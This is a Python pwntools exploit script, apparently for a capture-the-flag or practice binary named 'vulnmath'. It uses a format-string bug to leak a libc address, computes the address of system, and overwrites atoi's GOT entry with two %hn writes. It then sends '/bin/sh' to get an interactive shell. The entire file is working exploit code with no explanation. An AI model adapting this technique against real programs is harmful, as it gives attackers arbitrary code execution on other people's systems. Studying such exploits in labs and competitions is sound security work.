from pwn import *

context.log_level = "debug"
pipe = process("./vulnmath")

print(pipe.recvuntil("> "))
payload2Leak = "%21$x"
pipe.sendline(payload2Leak)
print(pipe.recvline())
leakAddr = int(pipe.recvline(),16)
print("Leak addr: 0x%x" % leakAddr)

libcBase = leakAddr - 0x223E34
print("libcBase address: 0x%x" % libcBase)

# calculate address of system
systemOff = 0x4dd50
sysAddr = libcBase + systemOff
print("system call: 0x%x" % sysAddr)

print(pipe.recvuntil("> "))
# # overwrite
atoiGOT = 0x0804c038
firstWrite = (sysAddr & 0xffff) - 0x8
secondWrite = ((sysAddr & 0xffff0000) >> 16)  - (sysAddr & 0xffff)
# print(str(firstWrite))
# print(str(secondWrite))

payload = "\x38\xc0\x04\x08\x3a\xc0\x04\x08"
payload += "%" + str(firstWrite) + "c"
payload += "%6$hn"
payload += "%" + str(secondWrite) + "c"
payload += "%7$hn"


pipe.sendline(payload)

# gdb.attach(pipe, gdbscript="x/wx 0x0804c038")
# pause()
pipe.sendline("/bin/sh\x00")
pipe.interactive()
